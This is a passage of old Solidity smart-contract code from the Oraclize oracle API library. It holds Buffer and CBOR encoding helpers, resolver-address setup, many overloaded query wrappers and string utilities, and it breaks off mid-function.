randomDS_getSessionPubKeyHash() external constant returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() public returns (address _addr);\n}\nlibrary Buffer {\n struct buffer {\n bytes buf;\n uint capacity;\n }\n function init(buffer memory buf, uint capacity) internal pure {\n if(capacity % 32 != 0) capacity += 32 - (capacity % 32);\n buf.capacity = capacity;\n assembly {\n let ptr := mload(0x40)\n mstore(buf, ptr)\n mstore(0x40, add(ptr, capacity))\n }\n }\n function resize(buffer memory buf, uint capacity) private pure {\n bytes memory oldbuf = buf.buf;\n init(buf, capacity);\n append(buf, oldbuf);\n }\n function max(uint a, uint b) private pure returns(uint) {\n if(a > b) {\n return a;\n }\n return b;\n }\n function append(buffer memory buf, bytes data) internal pure returns(buffer memory) {\n if(data.length + buf.buf.length > buf.capacity) {\n resize(buf, max(buf.capacity, data.length) * 2);\n }\n uint dest;\n uint src;\n uint len = data.length;\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n dest := add(add(bufptr, buflen), 32)\n mstore(bufptr, add(buflen, mload(data)))\n src := add(data, 32)\n }\n for(; len >= 32; len -= 32) {\n assembly {\n mstore(dest, mload(src))\n }\n dest += 32;\n src += 32;\n }\n uint mask = 256 ** (32 - len) - 1;\n assembly {\n let srcpart := and(mload(src), not(mask))\n let destpart := and(mload(dest), mask)\n mstore(dest, or(destpart, srcpart))\n }\n return buf;\n }\n function append(buffer memory buf, uint8 data) internal pure {\n if(buf.buf.length + 1 > buf.capacity) {\n resize(buf, buf.capacity * 2);\n }\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n let dest := add(add(bufptr, buflen), 32)\n mstore8(dest, data)\n mstore(bufptr, add(buflen, 1))\n }\n }\n function appendInt(buffer memory buf, uint data, uint len) internal pure returns(buffer memory) {\n if(len + buf.buf.length > buf.capacity) {\n resize(buf, max(buf.capacity, len) * 2);\n }\n uint mask = 256 ** len - 1;\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n let dest := add(add(bufptr, buflen), len)\n mstore(dest, or(and(mload(dest), not(mask)), data))\n mstore(bufptr, add(buflen, len))\n }\n return buf;\n }\n}\nlibrary CBOR {\n using Buffer for Buffer.buffer;\n uint8 private constant MAJOR_TYPE_INT = 0;\n uint8 private constant MAJOR_TYPE_NEGATIVE_INT = 1;\n uint8 private constant MAJOR_TYPE_BYTES = 2;\n uint8 private constant MAJOR_TYPE_STRING = 3;\n uint8 private constant MAJOR_TYPE_ARRAY = 4;\n uint8 private constant MAJOR_TYPE_MAP = 5;\n uint8 private constant MAJOR_TYPE_CONTENT_FREE = 7;\n function encodeType(Buffer.buffer memory buf, uint8 major, uint value) private pure {\n if(value <= 23) {\n buf.append(uint8((major << 5) | value));\n } else if(value <= 0xFF) {\n buf.append(uint8((major << 5) | 24));\n buf.appendInt(value, 1);\n } else if(value <= 0xFFFF) {\n buf.append(uint8((major << 5) | 25));\n buf.appendInt(value, 2);\n } else if(value <= 0xFFFFFFFF) {\n buf.append(uint8((major << 5) | 26));\n buf.appendInt(value, 4);\n } else if(value <= 0xFFFFFFFFFFFFFFFF) {\n buf.append(uint8((major << 5) | 27));\n buf.appendInt(value, 8);\n }\n }\n function encodeIndefiniteLengthType(Buffer.buffer memory buf, uint8 major) private pure {\n buf.append(uint8((major << 5) | 31));\n }\n function encodeUInt(Buffer.buffer memory buf, uint value) internal pure {\n encodeType(buf, MAJOR_TYPE_INT, value);\n }\n function encodeInt(Buffer.buffer memory buf, int value) internal pure {\n if(value >= 0) {\n encodeType(buf, MAJOR_TYPE_INT, uint(value));\n } else {\n encodeType(buf, MAJOR_TYPE_NEGATIVE_INT, uint(-1 - value));\n }\n }\n function encodeBytes(Buffer.buffer memory buf, bytes value) internal pure {\n encodeType(buf, MAJOR_TYPE_BYTES, value.length);\n buf.append(value);\n }\n function encodeString(Buffer.buffer memory buf, string value) internal pure {\n encodeType(buf, MAJOR_TYPE_STRING, bytes(value).length);\n buf.append(bytes(value));\n }\n function startArray(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_ARRAY);\n }\n function startMap(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_MAP);\n }\n function endSequence(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_CONTENT_FREE);\n }\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0))\n oraclize_setNetwork(networkID_auto);\n if(address(oraclize) != OAR.getAddress())\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n return oraclize_setNetwork();\n networkID;\n }\n function oraclize_setNetwork() internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) public {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) public {\n return;\n myid; result; proof;\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal pure returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal pure returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal pure returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal pure returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal pure returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal pure returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal pure returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal pure returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal pure returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal pure returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n using CBOR for Buffer.buffer;\n function stra2cbor(string[] arr) internal pure returns (bytes) {\n Buffer.buffer memory buf;\n Buffer.init(buf, 1024);\n buf.startArray();\n for (uint i = 0; i < arr.length; i++) {\n buf.encodeString(arr[i]);\n }\n buf.endSequence();\n return buf.buf;\n }\n function ba2cbor(bytes[] arr) internal pure returns (bytes) {\n Buffer.buffer memory buf;\n Buffer.init(buf, 1024);\n buf.startArray();\n for (uint i = 0; i < arr.length; i++) {\n buf.encodeBytes(arr[i]);\n }\n buf.endSequence();\n return buf.buf;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal view returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n require((_nbytes > 0) && (_nbytes <= 32));\n _delay *= 10;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes memory delay = new bytes(32);\n assembly {\n mstore(add(delay, 0x20), _delay)\n }\n bytes memory delay_bytes8 = new bytes(8);\n copyBytes(delay, 24, 8, delay_bytes8, 0);\n bytes[4] memory args = [unonce, nbytes, sessionKeyHash, delay];\n bytes32 queryId = oraclize_query(\"random\", args, _customGasLimit);\n bytes memory delay_bytes8_left = new bytes(8);\n assembly {\n let x := mload(add(delay_bytes8, 0x20))\n mstore8(add(delay_bytes8_left, 0x27), div(x, 0x100000000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x26), div(x, 0x1000000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x25), div(x, 